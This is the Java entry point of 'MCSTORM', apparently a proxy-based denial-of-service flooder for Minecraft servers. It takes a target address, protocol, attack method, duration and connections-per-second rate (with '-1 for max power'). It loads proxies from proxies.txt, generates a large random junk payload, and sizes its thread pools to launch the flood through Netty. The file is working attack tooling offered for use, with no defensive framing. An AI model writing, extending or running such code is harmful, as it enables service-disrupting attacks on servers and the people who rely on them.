package io.MCSTORM;

import io.MCSTORM.methods.Method;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.MCSTORM.utils.ServerAddress;

import java.io.BufferedReader;
import java.io.File;
import java.net.InetAddress;
import java.util.Random;
import java.util.Scanner;

public class Main {
    public static String origIP;
    public static String srvRecord;
    public static InetAddress resolved;
    public static String cusIp;
    public static int port;
    public static int protcolID;
    public static int protocolLength;
    public static String methodID;
    public static Method method;
    public static boolean http;
    public static int duration;
    public static int targetCPS;
    public static int nettyThreads;
    public static int loopThreads;
    public static String string;
    public static File proxyFile;
    public static BufferedReader proxyScrape;
    public static ProxyLoader proxies;

    public static void main(String[] args) throws Throwable {
        boolean pass = false;
        if (args.length == 6) {
            cusIp = args[5];
        } else
        if (args.length != 5) {
            System.err.println("[ERROR] Correct usage: java -jar " + (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI())).getName() + " <IP:PORT> <PROTOCOL> <METHOD> <SECONDS> <TARGETCPS>");
            System.err.println();
            System.err.println("<IP:PORT>       - IP and port of the server             | Examples: 36.90.48.40:25577 or mc.myserver.com");
            System.err.println("<PROTOCOL>      - Protocol version of the server        | Examples: 47 or 340");
            System.err.println("<METHOD>        - Which method should be used to attack | Examples: join or ping");
            System.err.println("<SECONDS>       - How long should the attack last       | Examples: 60 or 300");
            System.err.println("<TARGETCPS>     - How many connections per second       | Examples: 1000 or 50000 (-1 for max power)");
            System.err.println("[HTTP-IP]     - HTTP IP       | Examples: http://baidu.com/");
            System.err.println();
            System.err.println("Exit...");
            pass = true;
        }

        if (pass) return;

        http = args[2].equalsIgnoreCase("http");

        System.out.println("Fetching proxies...");
        (new Thread(() -> {
            Scanner scanner = new Scanner(System.in);
            String msg = "";
            do {
                msg = scanner.next().toLowerCase();
            } while (!msg.equals("fs") && !msg.equals("forcestop") && !msg.equals("s") && !msg.equals("stop") && !msg.equals("fk") && !msg.equals("forcekill"));
            scanner.close();
            System.out.println("\033[0;31m Please wait few sec force shutting down....");
            System.exit(0);
        })).start();
        proxyFile = new File("proxies.txt");
        if (!proxyFile.exists()) {
            System.err.println("[ERROR] File proxies.txt not found");
            System.err.println();
            System.err.println("File proxies.txt must contain list of HTTP/HTTPS Proxies.");
            System.err.println();
            System.err.println("Exit...");
            return;
        }
        proxies = new ProxyLoader(proxyFile);
        try {
            System.out.println("Resolving IP...");
            ServerAddress sa = ServerAddress.getAddrss(args[0]);
            srvRecord = sa.getIP();
            port = sa.getPort();
            resolved = InetAddress.getByName(srvRecord);
            System.out.println("Resolved IP: " + resolved.getHostAddress());
            origIP = args[0].split(":")[0];
            System.out.println("Orig IP: " + origIP);
            protcolID = Integer.parseInt(args[1]);
            methodID = args[2];
            duration = Integer.parseInt(args[3]);
            targetCPS = Integer.parseInt(args[4]) + (int) Math.ceil((Integer.parseInt(args[4]) / 100 * (50 + Integer.parseInt(args[4]) / 5000)));
            nettyThreads = (targetCPS == -1) ? 256 : (int) Math.ceil(6.4E-4D * targetCPS);
            loopThreads = (targetCPS == -1) ? 3 : (int) Math.ceil(1.999960000799984E-5D * targetCPS);
            protocolLength = (protcolID > 128) ? 3 : 2;
            Random r = new Random();
            for (int i = 1; i < 65536; i++) {
                string = String.valueOf(string) + (char) (r.nextInt(125) + 1);
            }
        } catch (Exception e) {
            e.printStackTrace();
            Thread.sleep(5000L);
            return;
        }
        Methods.setupMethods();
        method = Methods.getMethod(methodID);
        NettyBootstrap.start();
    }
}